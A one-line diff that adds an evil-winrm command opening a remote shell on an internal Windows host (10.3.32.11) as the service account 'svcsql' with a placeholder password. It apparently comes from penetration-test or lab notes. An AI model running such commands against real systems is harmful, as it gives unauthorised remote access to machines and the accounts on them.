@@ -1,0 +1,1 @@
+evil-winrm -i 10.3.32.11 -u 'svcsql@l33thackers.stellar.tech' -p 'password'   
